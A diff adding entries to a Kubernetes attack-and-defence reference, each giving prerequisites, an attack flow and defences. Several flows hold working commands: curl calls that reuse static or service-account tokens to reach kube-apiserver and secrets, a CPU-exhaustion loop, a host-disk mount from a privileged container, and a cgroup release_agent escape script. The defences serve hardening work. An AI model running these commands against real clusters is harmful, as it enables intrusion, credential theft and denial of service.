@@ -68,6 +68,32 @@ attacker can access kube-apiserver without credentials
 - Defence<br>
 `--anonymous-auth` set to false
 
+#### use static credentials to access kube-apiserver
+- Prerequisites
+	- `kube-apiserver` use `--basic-auth-file` or `--token-auth-file`
+	- `kube-apiserver` do not enable `NodeRestriction` admission
+	- `kube-apiserver` contain `AlwaysAllow` or `Node` in `--authorization-mode`
+	- do not delete kubelet's `--bootstrap-kubeconfig`
+- Flow<br>
+```shell
+curl -sk --connect-timeout 5 -H "Authorization: Bearer $token" https://${apiserver}
+curl -sk --connect-timeout 5 -H "Authorization: Basic $token" https://${apiserver}
+curl -sk --connect-timeout 5 --cert ./${kubelet_cert} --key ./${kubelet_cert_key} https://${apiserver}/api/v1/secrets
+```
+- Defence<br>
+	- do not use static credentials
+	- delete bootstrap-kubeconfig file or bootstrap-kubeconfig user
+
+#### kube-apiserver unauthorized access
+- Prerequisites
+	- `--authorization-mode`, 设置为`AlwaysAllow`
+- Flow<br>
+```shell
+curl -sk --connect-timeout 5 -H "Authorization: Bearer $token" https://${apiserver}/api/v1/pods
+```
+- Defence<br>
+`--authorization-mode` set to RBAC
+
 #### kubelet unauthenticated access
 > https://github.com/cyberark/kubeletctl
 
@@ -111,8 +137,127 @@ curl -sk --connect-timeout 5 http://169.254.169.254/openstack/latest/user_data
 	- use networkpolicy
 	- use iptables
 ```shell
-iptables -I INPUT -s ${container_net} -d 169.254.169.254 -j DROP
+iptables -I OUTPUT -s ${container_net} -d 169.254.169.254 -j DROP
+iptables -I FORWARD -s ${container_net} -d 169.254.169.254 -j DROP
 ```
+
+#### service account token access
+- Prerequisites
+	- `kube-apiserver` do not disable `ServiceAccount` admission
+	- mount service account secret `automountServiceAccountToken: true`
+	- `--authorization-mode` of `kubelet` is set to `AlwaysAllow`
+- Flow<br>
+```shell
+curl -sk --connect-timeout 5 -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://${apiserver}
+curl -sk --connect-timeout 5 -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://${ip}:10250/pods
+```
+- Defence<br>
+	- do not mount service account token
+	- `kubelet` set `--authorization-mode` to `Webhook`
+
+#### resourse occupation
+- Prerequisites
+	- do not use `LimitRange` in `namespace` or do not use `limits` in pod create
+- Flow<br>
+```shell
+for((i=0;i<8;i++));do bash -c "while :;do a=a;done &";done
+```
+- Defence<br>
+use `LimitRange` or `limits`
+
+#### privileged container
+- Prerequisites
+	- create pod with `"securityContext": { "privileged": true }`
+- Flow<br>
+```shell
+mount /dev/vda1 /mnt
+```
+- Defence<br>
+	- do not set `privileged` flag
+	- `kube-apiserver` set `--allow-privileged` to false
+
+#### use root user to escape
+- Prerequisites
+	- run container with root 
+- Flow<br>
+```shell
+# obtain all capabilities
+unshare -UCmr bash
+# use cgroup to escape
+mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^.]*\)/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /cmd
+echo "ps aux > $host_path/output" >> /cmd
+chmod a+x /cmd
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+sleep 2
+cat /output
+```
+- Defence<br>
+	- do not use root in container
+	- if there are some initial actions required root, use [init container](https://kubernetes.io/docs/concepts/workloads/pods/init-containers/) or seperate root and normal process in different container
+	- disable user namespace via `echo 0 > /proc/sys/user/max_user_namespaces`
+	- specify `fsGroup`、`runAsUser`、`runAsGroup` in `securityContext`
+
+#### write hostpath
+- Prerequisites
+	- use hostPath while creating pod
+- Flow<br>
+when pods use the same hostPath, a malicious user in one pod can modify files in hostPath and affect other pod
+- Defence<br>
+make hostPath readonly via 'volumeMounts: {"readOnly": true}', [reference](https://suraj.io/post/k8s-hostpat-nuke-nodes/)
+	
+#### privilege escalation in container
+- Prerequisites
+	- unsafe sudo config
+	- unsafe root process in container
+	- unsafe setcap binary
+	- unsafe system, has exploitable cve
+	- unsafe suid binary
+- Flow<br>
+use vulnerabilities to escalate privilege
+- Defence<br>
+	- run container as normal user
+	- set '"securityContext": {"allowPrivilegeEscalation": false}'
+
+#### kernel vulnerabilities
+- Prerequisites
+	- kernel has exploitable vulnerabilities
+	- user in container can trigger the vulnerability
+- Flow<br>
+use Dirty-Cow、Dirty-Pipe or other vulnerabilities
+- Defence<br>
+	- update kernel with all security patches
+	- use seccomp
+	- disable unprivileged bpf, `kernel.unprivileged_bpf_disabled = 1`
+	- disable kernel module autoload, `kernel.modules_disabled = 1`
+
+#### access host network
+- Prerequisites
+	- none
+- Flow<br>
+	- guess host ip address
+	- access host ssh service and brute-force password
+- Defence<br>
+	- deny high risk ports access from container
+```shell
+# deny container access host
+iptables -I INPUT -s ${container_net} -p tcp -m multiport --dports 22 -j DROP
+# deny container access other node
+iptables -I FORWARD -s ${container_net} -p tcp -m multiport --dports 22 -m state --state NEW -j DROP
+```
+
+#### access docker service
+- Prerequisites
+	- mount docker.sock in container
+	- docker enable remote api
+- Flow<br>
+use docker.sock or remote api to create privileged container
+- Defence<br>
+	- do not mount docker.sock in container
+	- disable docker remote api
 
 ## 组件安全
 
